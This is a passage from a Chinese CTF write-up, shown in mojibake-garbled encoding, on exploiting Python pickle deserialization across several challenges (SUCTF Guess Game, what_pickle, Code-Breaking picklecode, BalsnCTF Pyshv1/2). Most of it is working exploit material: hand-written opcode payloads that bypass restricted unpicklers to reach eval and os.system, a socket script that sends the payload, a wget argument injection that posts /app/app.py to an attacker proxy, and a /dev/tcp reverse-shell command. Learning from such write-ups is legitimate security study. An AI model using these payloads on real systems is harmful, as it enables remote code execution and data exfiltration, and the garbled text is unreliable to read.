æˆå˜é‡è¦†ç›–ã€‚\næ—¢ç„¶æˆ‘ä»¬å¯ä»¥åšåˆ°é‡å†™å˜é‡çš„å€¼ï¼Œé‚£ä¹Ÿå¯ä»¥å°†è¿™ä¸ªå€¼æ”¹ä¸ºread wrapperçš„è¿”å›å€¼åšåˆ°ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆè¯¦è§åé¢çš„å†…å®¹ï¼‰\n\u0026ndash;\u0026raquo;ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾çš„æ¨¡å—\u0026amp;æ¨¡å—åä¸èƒ½æœ‰__ç¬¦   æ —å­2 - [SUCTF 2019]Guess Game   æœ¬åœ°å¤ç°è¿˜æ˜¯å¤±è´¥ï¼Œæ— è§£ï¼Œdockeråœ°å€-\u0026gt;https://github.com/rmb122/suctf2019_guess_gameæ˜¯ä¸ªçŒœæ•°æ¸¸æˆï¼Œäº¤äº’é€»è¾‘åœ¨init.py, Game.pyå’ŒTicket.pyä¸­ï¼Œ10ä»¥å†…çš„æ•°å­—éœ€è¦çŒœå¯¹10æ¬¡ï¼ˆå…¨èƒœï¼‰æ‰ä¼šè¿”å›flag\nç„¶åæ˜¯game_client.py\næ¥æ”¶æ•°å­—çš„è¾“å…¥ä½œä¸ºå‚æ•°ç”ŸæˆTicketå¯¹è±¡ï¼Œåºåˆ—åŒ–åå‘é€åˆ°serverç«¯\nå†çœ‹game_server.pyï¼Œç”¨äº†é‡å†™äº†çš„find_class()\nè¿™ä¸ªé™åˆ¶çš„æ„æ€æ˜¯å¯¼å…¥çš„æ¨¡å—åªèƒ½ä»¥guess_nameå¼€å¤´å¹¶ä¸”åå­—é‡Œæ²¡æœ‰__\nå¤§æ¦‚çœ‹å®Œäº†æµç¨‹ï¼Œæ¥ä¸‹æ¥æ‰¾æ‰¾çªç ´å£â€”â€”åºåˆ—åŒ–æ—¶æ˜¯ç”Ÿæˆä¸€ä¸ªTicketçš„å®ä¾‹\nåˆ¤æ–­è¾“èµ¢åˆ™æ˜¯éœ€è¦Gameè¾…åŠ©\nç»“åˆgame_server.pyçš„åˆ¤æ–­æ¡ä»¶ï¼Œæ‹¿åˆ°flagéœ€è¦self.win_count == max_round == 10\né‚£ä¹ˆæ„é€ çš„æ–¹å‘æœ‰äº†â€”â€”ä¿®æ”¹ç›¸å…³å‚æ•°åšåˆ°å˜é‡è¦†ç›–ï¼Œå†ä»¥åºåˆ—åŒ–çš„opcodeå½¢å¼ä¼ è¿‡å»ã€‚æ‰‹å†™opcodeé¢ä¸´çš„é—®é¢˜å°±æ˜¯é‡å†™find_class()åå¯¹åŠ è½½æŒ‡å®šæ¨¡å—çš„é™åˆ¶ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°__init__.pyä¸­game = Game()ï¼Œæ‰€ä»¥ç›´æ¥å¯ä»¥é€šè¿‡guess_game.gameå¼•å…¥Game()ç±»ï¼Œç„¶åä¿®æ”¹ç±»ä¸­çš„win_countå’Œround_countå°±èƒ½åšåˆ°å˜é‡è¦†ç›–ï¼›ç¬¬äºŒè¦æ³¨æ„å¿…é¡»æ‰‹å†™opcodeï¼Œå¦‚æœæ˜¯å…ˆfrom guess_name import gameï¼Œç„¶åä¿®æ”¹å‚æ•°åå†dumpï¼Œåˆ™æ˜¯åœ¨è¿è¡Œæ—¶é‡æ–°æ–°å»ºä¸€ä¸ªGameå¯¹è±¡ï¼Œå°±ä¸æ˜¯ä»guess_gameè¿™ä¸ªmoduleä¸­è·å–ï¼Œç ´åä¸Šä¸‹æ–‡ï¼›ç¬¬ä¸‰è¦æ³¨æ„\npickleåºåˆ—åŒ–æµæ‰§è¡Œå®Œä¼šæŠŠæ ˆé¡¶çš„å€¼è¿”å›ï¼Œæ‰€ä»¥æ ˆé¡¶éœ€è¦è®¾ä¸ºTicketï¼Œè¿™é‡Œå¯ä»¥dumpsä¸€ä¸ªTicketï¼Œç„¶åæ‹¼åˆ°ä¹‹å‰æ‰‹å†™çš„opcodeä¹‹å\nopcodes:\n# ä¿®æ”¹win_count = 10å’Œround_count = 9ï¼Œä¼ è¿‡å»ä¹‹åæ‰§è¡Œä¸€æ¬¡round_count += 1å°±èƒ½å…¨èƒœ cguess_name game }S\u0026#34;win_count\u0026#34; I10 sS\u0026#34;round_count\u0026#34; I9 sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb. # cä¹‹åæ˜¯è¢«find_class()ç›‘æ§çš„åŒºåŸŸï¼Œæ‹¼æ¥Ticket import socket import struct s = socket.socket() s.connect((\u0026#39;node4.buuoj.cn\u0026#39;, 28803)) exp = b\u0026#39;\u0026#39;\u0026#39;cguess_game game }S\u0026#34;win_count\u0026#34; I10 sS\u0026#34;round_count\u0026#34; I9 sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb.\u0026#39;\u0026#39;\u0026#39; s.send(struct.pack(\u0026#39;\u0026gt;I\u0026#39;, len(exp))) s.send(exp) print(s.recv(1024)) print(s.recv(1024)) print(s.recv(1024)) print(s.recv(1024)) â€”â€”â€”â€”ç”¨pker\nticket = INST(\u0026#39;guess_game.Ticket\u0026#39;, \u0026#39;Ticket\u0026#39;, 0) game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = ticket return ticket # b\u0026#34;(I0\\niguess_game.Ticket\\nTicket\\np0\\n0cguess_game\\ngame\\np1\\n0g1\\n(N(S\u0026#39;curr_ticket\u0026#39;\\ng0\\ndtbg0\\n.\u0026#34;    æ —å­3 - [å·…å³°æå®¢ 2021]what_pickle   ç™»å½•é¡µé¢ ä»»æ„å¯†ç å‡å¯ç™»å…¥ï¼Œä»…æ˜¾ç¤ºä¸€å¼ å›¾ç‰‡+ç™»å½•æ—¶è¾“å…¥çš„å¯†ç ï¼›å›¾ç‰‡çš„urlä¸º/images?image=2.jpgï¼Œä½†æ˜¯ä¸èƒ½å¸¸è§„çš„ç›®å½•ç©¿è¶Šæ‹¿æºç ï¼Œå½“æ—¶åšçš„æ—¶å€™å°±ä¸ä¼šäº†ï¼Œä¸‹é¢æ˜¯å¤ç°\n/imageså¯ä»¥çœ‹åˆ°å¼€ç€çš„debugç•Œé¢\nèƒ½çœ‹åˆ°éƒ¨åˆ†çš„æºç ï¼Œè¿™é‡Œçš„å›¾ç‰‡æ˜¯ç”¨çš„wgetå‘½ä»¤æ¥ä¸‹è½½æœ¬åœ°8080ç«¯å£çš„/imageå›¾ç‰‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•wgetå‘½ä»¤æ³¨å…¥å°†æ–‡ä»¶å¤–å¸¦å‡ºæ¥\n/images?image=\u0026amp;argv=--post-file=/app/app.py\u0026amp;argv=--execute=http_proxy=http://ip:port /images?image=\u0026amp;argv=â€”post-file=/app/app.py\u0026amp;argv=-e http_proxy=http://ip:port ä¾æ¬¡è¯»å‡º/app/app.pyå’Œ/app/config.py\n# app.py from flask import Flask, request, session, render_template, url_for,redirect import pickle import io import sys import base64 import random import subprocess from ctypes import cdll from config import SECRET_KEY, notadmin,user cdll.LoadLibrary(\u0026#34;./readflag.so\u0026#34;) app = Flask(__name__) app.config.update(dict( SECRET_KEY=SECRET_KEY, )) class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in [\u0026#39;config\u0026#39;] and \u0026#34;__\u0026#34; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(\u0026#34;global \u0026#39;%s.%s\u0026#39; is forbidden\u0026#34; % (module, name)) def restricted_loads(s): \u0026#34;\u0026#34;\u0026#34;Helper function analogous to pickle.loads().\u0026#34;\u0026#34;\u0026#34; return RestrictedUnpickler(io.BytesIO(s)).load() @app.route(\u0026#39;/\u0026#39;) @app.route(\u0026#39;/index\u0026#39;) def index(): if session.get(\u0026#39;username\u0026#39;, None): return redirect(url_for(\u0026#39;home\u0026#39;)) else: return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def login(): name = request.form.get(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) data = request.form.get(\u0026#39;data\u0026#39;, \u0026#39;test\u0026#39;) User = user(name,data) session[\u0026#34;info\u0026#34;]=base64.b64encode(pickle.dumps(User)) return redirect(url_for(\u0026#39;home\u0026#39;)) @app.route(\u0026#39;/home\u0026#39;) def home(): info = session[\u0026#34;info\u0026#34;] User = restricted_loads(base64.b64decode(info)) Jpg_id = random.randint(1,5) return render_template(\u0026#39;home.html\u0026#39;,id = str(Jpg_id), info = User.data) @app.route(\u0026#39;/images\u0026#39;) def images(): command=[\u0026#34;wget\u0026#34;] argv=request.args.getlist(\u0026#39;argv\u0026#39;) true_argv=[x if x.startswith(\u0026#34;-\u0026#34;) else \u0026#39;--\u0026#39;+x for x in argv] image=request.args[\u0026#39;image\u0026#39;] command.extend(true_argv) command.extend([\u0026#34;-q\u0026#34;,\u0026#34;-O\u0026#34;,\u0026#34;-\u0026#34;]) command.append(\u0026#34;http://127.0.0.1:8080/\u0026#34;+image) image_data = subprocess.run(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE) return image_data.stdout if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=True, port=80) # config.py SECRET_KEY=\u0026#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy\u0026#34; notadmin={\u0026#34;admin\u0026#34;:\u0026#34;no\u0026#34;} class user(): def __init__(self, username, data): self.username = username self.data = data def backdoor(cmd): if isinstance(cmd,list) and notadmin[\u0026#34;admin\u0026#34;]==\u0026#34;yes\u0026#34;: s=\u0026#39;\u0026#39;.join(cmd) eval(s) è¿™é‡Œçš„é™åˆ¶æŒºç®€å•çš„äº†ï¼Œè¦†ç›–ä¸€ä¸ªnotadminå­—å…¸adminé”®çš„å€¼ä¸ºyeså³å¯æ‰§è¡Œç»™å‡ºçš„åé—¨å‡½æ•°eval()\n# ç”¨pker.pyç”Ÿæˆpayload s=GLOBAL(\u0026#34;config\u0026#34;,\u0026#34;notadmin\u0026#34;) s[\u0026#34;admin\u0026#34;]=\u0026#34;yes\u0026#34; user=INST(\u0026#34;config\u0026#34;,\u0026#34;user\u0026#34;) user.username=\u0026#34;tyskill\u0026#34; user.data=\u0026#34;tyskill\u0026#34; door=INST(\u0026#34;config\u0026#34;,\u0026#34;backdoor\u0026#34;,[\u0026#34;__import__(\u0026#39;subprocess\u0026#39;).call(\\\u0026#34;echo -e \u0026#39;#!/bin/bash\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\\\u0026#34;,shell=True)\u0026#34;]) return user ç„¶åbase64.b64encode(data)åŠ è¿›session['info']ä¸­æ‹¿åˆ°shell\nçœ‹wpï¼Œåé¢çš„æ­¥éª¤å¥½åƒè¿˜è·Ÿpwnæœ‰ç‚¹å…³ç³»ï¼Œæˆ‘å¯¹pwnæ¯«æ— ç ”ç©¶ï¼Œä¸çŒ®ä¸‘äº†ï¼ŒæŒ‡è·¯ä¸¤ä¸ªwp-\u0026gt;wp1 | wp2\n \u0026ndash;\u0026raquo;ä»…å¯ä»¥å¼•å…¥builtinsæ¨¡å— æ›´å¤šçŸ¥è¯†å‚è€ƒï¼šæ·±å…¥ç†è§£Pythonä¸­çš„__builtin__å’Œ__builtins__ | [Python çš„å†…å»ºå¯¹è±¡](https://www.jianshu.com/p/645e973 83c1f) | __builtins__ ä¸ __builtin__ï¼ˆbuiltinsï¼‰\n  æ —å­4 - [Code-Breaking 2018] picklecode   æœ¬åœ°å¤ç°è¿˜æ˜¯å¤±è´¥ï¼Œdockeråœ°å€-\u0026gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecodeï¼ˆå°±è·Ÿè¢«dockerè¯…å’’äº†ä¸€æ · ä»æ¥æ²¡æœ‰æˆåŠŸçš„ç”¨dockerå¤ç°è¿‡ä¸€é“é¢˜ğŸ˜­ğŸ˜­ğŸ˜­çœŸå°±è„‘è¡¥å‡ºflagäº†\nå®¡è®¡æºç ï¼Œæ˜¯ä¸€ä¸ªdjangoçš„é¡¹ç›®ï¼ˆæ­£å¥½ä¹‹å‰çš„å®è®­åšçš„å°±æ˜¯djangoçš„é¡¹ç›®ï¼Œçœ‹æºç è½»æ¾ä¸€äº›ï¼‰ï¼Œä¸»æ–‡ä»¶å¤¹æ˜¯coreï¼Œæœ‰ä¸€ä¸ªåä¸ºchallengeçš„app\nçœ‹coreä¸‹çš„settings.pyæ¯”é»˜è®¤çš„é…ç½®å¤šäº†54å’Œ55è¡Œ\nç”¨äº†ç‰¹æ®Šçš„SESSION_ENGINEå’ŒSESSION_SERIALIZERï¼Œå‰è€…æŒ‡çš„æ˜¯djangoå°†ç”¨æˆ·è®¤è¯ä¿¡æ¯å­˜å‚¨åœ¨å“ªé‡Œ åè€…æŒ‡djangoç”¨ä»€ä¹ˆæ–¹å¼å­˜å‚¨è®¤è¯ä¿¡æ¯ï¼Œä¹Ÿå°±ç›¸å½“äºå…ˆç»è¿‡SESSION_SERIAZLIZERæŒ‡å®šçš„æ–¹å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå†æœ‰SESSION_ENGINEæŒ‡å®šçš„æ–¹å¼å­˜å‚¨åˆ°æŸä¸ªåœ°æ–¹ã€‚é»˜è®¤çš„djangoé¡¹ç›®ä¸­ï¼Œå­˜å‚¨ä½ç½®åº”è¯¥æ˜¯django.contrib.sessions.backends.dbï¼Œåºåˆ—åŒ–æ–¹å¼åº”è¯¥æ˜¯django.contrib.sessions.serializers.JSONSerializerï¼›è€Œè¿™é‡Œå°±æ˜¯ç”¨pickleåºåˆ—åŒ–åçš„å½¢å¼ï¼ŒåŠ ç­¾åsingedåå­˜å‚¨åœ¨cookieä¸­ã€‚é‚£è¿™é‡Œè‚¯å®šè¦æ§åˆ¶sessionï¼Œç»“åˆpickleæ¥rceäº†ï¼›è·Ÿè¿‡å»çœ‹çœ‹\nä¾æ—§æ˜¯é‡å†™äº†find_class()æ–¹æ³•ï¼Œåªæœ‰æ¨¡å—æ˜¯å†…ç½®çš„builtinsï¼ˆä¸éœ€è¦importå°±å¯ä»¥ç”¨çš„ï¼‰å¹¶ä¸”åå­—ä¸èƒ½åœ¨é»‘åå•ä¸­æ‰å¯ä»¥ï¼›è¿™é‡Œçš„ç»•è¿‡æ˜¯ç¬¬äºŒä¸ªè€ƒç‚¹äº†ï¼Œå…ˆç¿»å›å»çœ‹ä¸€ä¸‹ä»…æœ‰çš„appçš„views.py\næ¨¡æ¿éƒ¨åˆ†ç›´æ¥æ‹¼æ¥äº†request.user.usernameï¼Œè¿™æ˜¯æ³¨å†Œæ—¶ä¼ å…¥ï¼Œæœ‰æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œæ‰¾æ‰¾è°ƒç”¨é“¾\nï¼ˆå› ä¸ºæœ¬åœ°ç¯å¢ƒå¤ªåƒåœ¾äº† æ²¡å¤ç° è¿™é‡Œäº‘åšé¢˜äº†ï¼‰åœ¨æ¨¡æ¿å¤„ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šçš„ä¸Šä¸‹æ–‡å˜é‡ï¼Œé€šå¸¸ä¼šå­˜åœ¨çš„æœ‰request, user, permsï¼Œè¿™é‡Œç”¨çš„åˆ©ç”¨é“¾æ˜¯ï¼ˆæ³¨æ„djangoæ¨¡æ¿å¼•æ“æ— æ³•è¯»å–ä¸‹åˆ’çº¿å¼€å¤´çš„å±æ€§ï¼‰{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}ï¼Œæ³¨å†Œä¸€ä¸ªåä¸ºè¿™ä¸ªçš„ç”¨æˆ·å³å¯è·å¾—ç­¾åçš„å¯†é’¥ã€‚\nå†æ‰å¤´å›å»æ€è€ƒopcodeçš„ç¼–å†™ã€‚é‡å†™find_class()ä¹‹åé™åˆ¶å¾ˆå¤šï¼Œä½†é€šè¿‡builtinsä»ç„¶å¯ä»¥ç”¨getattr()ï¼›é‚£ä¹ˆå°±åˆ†ä¸¤æ­¥èµ°ï¼Œå…ˆé€šè¿‡builtins.getattr('builtins, 'eval')æ¥è·å–eval()ï¼Œå†æ‰§è¡Œä»£ç ã€‚é‚£ä¹ˆå¦‚ä½•æ‰‹å†™protocol=0çš„opcodeæï¼Ÿ\né¦–å…ˆå¼•å…¥æ¨¡å—builtinså’Œå‡½æ•°getattr\ncbuiltins getattr ç„¶åéœ€è¦è·å–å½“å‰çš„ä¸Šä¸‹æ–‡ï¼Œç”¨globals()\ncbuiltins globals globalsæ˜¯ä¸ªå­—å…¸ï¼Œæ‰€ä»¥è¿˜è¦è·å–dictè¿™ä¸ªå¯¹è±¡\ncbuiltins dict è¿˜è¦æ‰§è¡Œglobals()è·å–å®Œæ•´ä¸Šä¸‹æ–‡\ncbuiltins globals (tR æ ˆé¡¶å…ƒç´ æ˜¯builtins.globalsï¼Œå‹å…¥ä¸€ä¸ªç©ºå…ƒç»„(tï¼Œç„¶åç”¨Ræ‰§è¡Œ\nç„¶åç”¨dict.get()æ–¹æ³•ä»globalsçš„å­—å…¸ä¸­æ‹¿åˆ°é”®åä¸ºbuiltionsçš„å€¼\ncbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tR. ååºåˆ—åŒ–åå¾—åˆ°builtinså¯¹è±¡\u0026lt;module 'builtins' (built-in)\u0026gt;ï¼›ä¹‹åå†ç”¨getatträ»builtinså¯¹è±¡ä¸­å–å‡ºevalï¼Œä¹Ÿå°±æ˜¯å†å¥—ä¸€å±‚å¨ƒ\ncbuiltins getattr (cbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tRS\u0026#39;eval\u0026#39; tR. \u0026lt;built-in function eval\u0026gt;ç°åœ¨å·²ç»æ‹¿åˆ°äº†evalå¯¹è±¡ï¼Œå†æ‰§è¡Œä»£ç \ncbuiltins getattr (cbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tRS\u0026#39;eval\u0026#39; tR(S\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;)\u0026#39; tR. æˆåŠŸæ‰§è¡Œä»£ç ï¼ˆæ³¨æ„è¿è¡Œæ—¶ä¸ä»…éœ€è¦å¼•å…¥pickle ä¹Ÿè¦å¼•å…¥builtinsæ‰å¯ä»¥ï¼ï¼‰\nâ€”â€”â€”â€”ç”¨pker\ngetattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) dict = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;dict\u0026#39;) dict_get = getattr(dict, \u0026#39;get\u0026#39;) globals = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;globals\u0026#39;) builtins = globals() __builtins__ = dict_get(builtins, \u0026#39;__builtins__\u0026#39;) eval = getattr(__builtins__, \u0026#39;eval\u0026#39;) eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;) return # b\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\\u0026#39;get\\\u0026#39;\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\\u0026#39;__builtins__\\\u0026#39;\\ntRp5\\n0g0\\n(g5\\nS\\\u0026#39;eval\\\u0026#39;\\ntRp6\\n0g6\\n(S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\\\u0026#39;\\ntR.\u0026#39; å‚è€ƒï¼šwp1 | Code-Breakingä¸­çš„ä¸¤ä¸ªPythonæ²™ç®± | Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆDjangoä¸ºä¾‹ï¼‰\n \u0026ndash;\u0026raquo;ä»…å¯ä»¥å¼•å…¥sysæ¨¡å—\u0026amp;åå­—ä¸­ä¸å¸¦.ç‚¹å·   æ —å­5 - [BalsnCTF 2019] Pyshv1   é¢˜ç›®ç¯å¢ƒ-\u0026gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1\nå®¡è®¡ä¸€ä¸‹æºç ï¼Œå…ˆçœ‹ä¸€ä¸‹è‚¯å®šä¼šä¸secureçš„securePickle.oy\né‡å†™find_class()ï¼Œè¢«è°ƒç”¨æ—¶å¯ä»¥çµæ´»æ·»åŠ ç™½åå•ï¼›å†çœ‹çœ‹server.py\nå°†è¾“å…¥çš„å†…å®¹å…ˆè½¬ä¸ºasciiç å½¢å¼è¢«b64åŠ å¯†ï¼Œå†ååºåˆ—åŒ–å‡ºæ¥ï¼›å…¶ä¸­ç™½åå•æ˜¯sysæ¨¡å—\nä½†æ˜¯è¿™ä¸ªsysæ¨¡å—å¹¶ä¸å®‰å…¨ï¼šsysæ¨¡å—æœ‰ä¸€ä¸ªå­—å…¸å¯¹è±¡sys.modulesï¼Œå®ƒåŒ…å«äº†è¿è¡Œæ—¶æ‰€æœ‰pyç¨‹åºæ‰€å¼•å…¥çš„æ‰€æœ‰æ¨¡å—(a cache of imported modules) ï¼Œå¦‚æœå®ƒè¢«æ”¹å˜ å¼•å…¥çš„æ¨¡å—å°±ä¼šè¢«æ”¹å˜ã€‚è€Œå®ƒä¹ŸåŒ…æ‹¬sysæœ¬èº«ï¼Œä¹Ÿå°±æ˜¯å¥—å¨ƒsys.modules['sys']=sys.modulesã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å…ˆä»sysä¸­å¼•å…¥modules: import modules from sysï¼Œç„¶åå°†modules['sys']æ”¹ä¸ºmodules['os']å°±å°†æˆåŠŸå¼•å…¥osæ¨¡å—ã€‚\nä½†æœ‰ä¸ªç¼ºé™·æ˜¯modulesä¸ºdictï¼Œéœ€è¦ç”¨getattr(sys.modules[module], name)è¿›è¡Œå–å€¼ï¼Œä¹Ÿå°±æ˜¯å…ˆå–å‡ºmodulesä¸­çš„getå‡½æ•°ï¼Œç„¶åå†ç”¨getæ¥å–å‡ºosï¼Œå†è¿›è¡Œæ›¿æ¢ä¿®æ”¹\npker\nmodules=GLOBAL('sys', 'modules') modules['sys']=modules modules_get=GLOBAL('sys', 'get') os=modules_get('os') modules['sys']=os system=GLOBAL('sys', 'system') system('dir') return opcode:\nb\u0026quot;csys\\nmodules\\np0\\n0g0\\nS'sys'\\ng0\\nscsys\\nget\\np2\\n0g2\\n(S'os'\\ntRp3\\n0g0\\nS'sys'\\ng3\\nscsys\\nsystem\\np5\\n0g5\\n(S'dir'\\ntR.\u0026quot;  \u0026ndash;\u0026raquo;ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾ç©ºæ¨¡å—   æ —å­6 - [BalsnCTF 2019] Pyshv2   é¢˜ç›®ç¯å¢ƒ-\u0026gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2\nfind_class()ç¨æœ‰åŒºåˆ«ï¼Œåœ¨getattr()ä¹‹å‰å…ˆç”¨äº†__import__()\nè¿™æ¬¡çš„ç™½åå•æ˜¯structsï¼Œç„¶é¹…è¿™æ˜¯ä¸ªç©ºçš„æ¨¡å— è™šæ™ƒä¸€æªã€‚ä¸è¿‡æ˜¯ç©ºçš„ä¸è¦ç´§ï¼Œç…§æ ·æœ‰å†…ç½®æ–¹æ³•ã€‚\n__builtins__æ˜¯æ‰€æœ‰æ¨¡å—å…¬æœ‰çš„å­—å…¸ï¼Œè®°å½•æ‰€æœ‰çš„å†…å»ºå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å¯¹__builtins__å†…ç›¸åº”çš„é”®æ¥ä¿®æ”¹å¯¹åº”çš„å‡½æ•°ï¼Œä¸Šå›¾ä¸­æˆ‘ä»¬æ‰¾åˆ°äº†evalæ–¹æ³•ï¼Œä½†å–å‡ºevalè¿™ä¸ªé”®å¦å¤–éœ€è¦ä¸€ä¸ªgetæ–¹æ³•æ‰èƒ½åšåˆ°ã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œ__getattribute__é­”æœ¯æ–¹æ³•å¯ä»¥è®¿é—®ä»»æ„å±æ€§ã€‚è€ŒåŒæ—¶__import__å¹¶ä¸æ˜¯é“æ¿ä¸€å—ï¼Œå®ƒçš„å…¨éƒ¨å‚æ•°æ˜¯__import__(name, globals=None, locals=None, fromlist=(), level=0)ï¼Œå®ƒå¯ä»¥è¢«æ›¿æ¢ï¼ˆé€šè¿‡å¯¼å…¥builtinsæ¨¡å—å¹¶èµ‹å€¼ç»™builtins.__import__ï¼‰æ¥å¯ä»¥ä¿®æ”¹importè¯­å¥çš„è¯­ä¹‰å¹¶ä¸”ä¸ä¼šå¯¼è‡´ä»£ç é—®é¢˜ï¼Œè€Œé¢˜ç›®ä¸­é‡å†™çš„find_class()ç‰¹åœ°åœ¨getattr()ä¹‹å‰è°ƒç”¨äº†__import__ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥åŠ«æŒè¿™ä¸ª__import__ï¼Œè®©å®ƒå˜ä¸º__getattribute__ï¼Œè®©æˆ‘ä»¬å¼•å…¥çš„structså˜ä¸ºstructs.__getattribute__(structs).xxxã€‚\nå¯¹äºå¼•å…¥æ¨¡å—çš„æ£€æŸ¥åªä¼šå‡ºç°åœ¨b\u0026rsquo;c\u0026rsquo;æ—¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç”¨Sæ“ä½œç åŠ«æŒ__import__æ—¶å¹¶ä¸ä¼šå¼•å‘find_class()çš„è¿‡æ»¤ã€‚\nç„¶è€Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥getattr()=getattr()è¿™æ ·è¦†ç›–__import__ï¼Œæˆ‘ä»¬è¿˜éœ€è¦__dict__çš„å¸®å¿™ã€‚__dict__æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå­˜å‚¨å¹¶å†³å®šäº†ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§ï¼Œå¦‚æœå®ƒçš„å†…å®¹è¢«æ”¹å˜ï¼Œå±æ€§ä¹Ÿä¼šè·Ÿç€æ”¹å˜ã€‚\næ‰€ä»¥æ•´åˆä¸€ä¸‹ä¸Šé¢çš„æ€è·¯ï¼šæˆ‘ä»¬å…ˆè¦å¼•å…¥åŠ©æ‰‹liststructs.__dict__ï¼Œå–å‡ºstructsç©ºæ¨¡å—çš„å†…å»ºå‡½æ•°ï¼ˆä¸€ä¸ªå¾…å–çš„dictï¼‰structs.__builtins__å’Œæˆ‘ä»¬éœ€è¦çš„é­”æœ¯æ–¹æ³•structs.__getattribute__ã€‚ä¹‹åä»å†…å»ºå‡½æ•°structs.__builtins__ä¸­å°†é”®åä¸º__import__çš„å€¼æ›¿æ¢ä¸ºstructs.__getattribute__ï¼Œç„¶åå€ŸåŠ©__dict__å°†structsçš„structså±æ€§è¦†ç›–ä¸ºä¿®æ”¹åçš„å†…å»ºå‡½æ•°ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å†æ¬¡ç”¨b\u0026rsquo;c\u0026rsquo;ä»structsä¸­å¼•å…¥getæ—¶è§¦å‘find_class()ä¸­çš„__import__ï¼Œä¹Ÿå°±ç›¸å½“äºåœ¨æ‰§è¡Œstructs.__getattribute__('structs').getï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°äº†getæ–¹æ³•ã€‚è€Œä¹‹å‰æˆ‘ä»¬åˆå·²ç»æ›¿æ¢äº†structså±æ€§ä¸ºå†…å»ºå‡½æ•°__builtins__ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°çš„getæ–¹æ³•å°±å¯ä»¥ä»__builtins__ä¸­å–å‡ºevalï¼Œæ‰§è¡Œä»£ç äº†ã€‚ä¹‹åæ‰§è¡Œä»£ç çš„éƒ¨åˆ†åŒä¸Šé¢çš„sys.modulesçš„æ€è·¯ã€‚\npker\n__dict__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__dict__\u0026#39;) __builtins__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__builtins__\u0026#39;) gtat = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__getattribute__\u0026#39;) __builtins__[\u0026#39;__import__\u0026#39;] = gtat __dict__[\u0026#39;structs\u0026#39;] = __builtins__ builtin_get = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;get\u0026#39;) eval = builtin_get(\u0026#39;eval\u0026#39;) eval(\u0026#39;pickle.sys.modules[\u0026#39;os\u0026#39;].system(\u0026#39;cat ../flag.txt\u0026#39;)\u0026#39;) return opcode\nb\u0026quot;cstructs\\n__dict__\\np0\\n0cstructs\\n__builtins__\\np1\\n0cstructs\\n__getattribute__\\np2\\n0g1\\nS'__import__'\\ng2\\nsg0\\nS'structs'\\ng1\\nscstructs\\nget\\np5\\n0g5\\n(S'eval'\\ntRp6\\n0g6\\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\\ntR.\u0026quot;  ç¦æ­¢b'R'æ“ä½œç  